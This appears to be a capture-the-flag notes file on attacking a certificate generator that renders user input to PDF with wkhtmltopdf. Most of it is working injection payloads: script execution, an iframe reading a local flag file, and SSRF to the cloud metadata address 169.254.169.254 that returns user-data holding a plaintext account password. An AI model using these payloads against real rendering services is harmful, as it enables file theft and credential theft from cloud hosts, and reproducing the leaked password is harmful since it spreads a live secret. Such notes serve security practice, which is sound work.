# Certificate Template

- Accepts user input and renders into PDF
- Server: Werkzeug/2.0.1 Python/3.8.10
- PDF generator: wkhtmltopdf
- NOTE: HTTPS requests don't work, but HTTP is fine

## Questions
- Can we get runtime code executed? Yes
  - Can we make external API calls? YES, only to non-https and only GETs it seems.
- Does LFI work? Using file:///etc/passwd doesn't seem to
    This makes me think that there may be another way to get LFI
- Can we find interesting information with SSRF?
    kkkkk

## PoCs

**Injection**
`lastname=TPurp&number=5&name=<h1>hi</h1>`

**Local Filepath**
`lastname=TPurp&number=5&name=<script>document.write(document.location)</script>`
File is at /tmp/wktemp-:uuid.html

**Iframe**
`lastname=TPurp&number=5&name=<iframe src=""></iframe>`
`lastname=TPurp&number=5&name=<iframe src="file:///chal/sec9et_fl46.txt"></iframe>`

**Script Execution**
`lastname=TPurp&number=5&name=<script>document.write(123)</script>`

**SSRF**
`lastname=TPurp&number=5&name=<iframe src="http://169.254.169.254/latest/meta-data/" height="200" width="400"></iframe>`

**Password leak?**
`lastname=TPurp&number=5&name=<iframe src="http://169.254.169.254/latest/user-data" height="3000" width="500"></iframe>`
Returns data with:
```
chpasswd:
  list: |
    debian: QdQqBeM6rcQv
```
